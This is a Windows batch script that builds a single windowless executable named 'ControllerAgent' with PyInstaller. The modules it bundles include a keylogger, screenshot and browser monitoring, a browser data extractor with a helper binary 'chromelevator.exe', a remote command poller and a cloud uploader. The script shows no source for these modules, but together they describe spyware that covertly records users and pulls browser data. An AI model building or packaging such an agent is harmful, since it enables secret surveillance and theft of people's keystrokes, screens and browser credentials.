@echo off
echo Building Windows Agent...

:: Change to agent directory to ensure clean build context
cd agent

:: Ensure PyInstaller is installed
pip install pyinstaller

:: Clean previous builds
if exist build rmdir /s /q build
if exist dist rmdir /s /q dist
if exist *.spec del *.spec

:: Build the agent
:: We explicitly include all submodules because they are imported lazily inside functions
pyinstaller --noconfirm --onefile --windowed --clean ^
    --name "ControllerAgent" ^
    --hidden-import=win32timezone ^
    --hidden-import=mss ^
    --hidden-import=pynput.keyboard._win32 ^
    --hidden-import=pynput.mouse._win32 ^
    --hidden-import=core ^
    --hidden-import=core.queue_manager ^
    --hidden-import=core.auth ^
    --hidden-import=core.config_manager ^
    --hidden-import=core.policy_engine ^
    --hidden-import=network ^
    --hidden-import=network.api_client ^
    --hidden-import=network.command_poller ^
    --hidden-import=modules ^
    --hidden-import=modules.uploader.cloudinary_client ^
    --hidden-import=modules.uploader.metadata_sync ^
    --hidden-import=modules.screenshot.capture ^
    --hidden-import=modules.screenshot.browser_monitor ^
    --hidden-import=modules.browser.extractor ^
    --hidden-import=modules.keylogger.keylogger ^
    --add-data ".env;." ^
    --add-data "modules/browser/bin/chromelevator.exe;modules/browser/bin" ^
    main.py

echo Build complete! Executable is in agent/dist/ControllerAgent.exe
pause
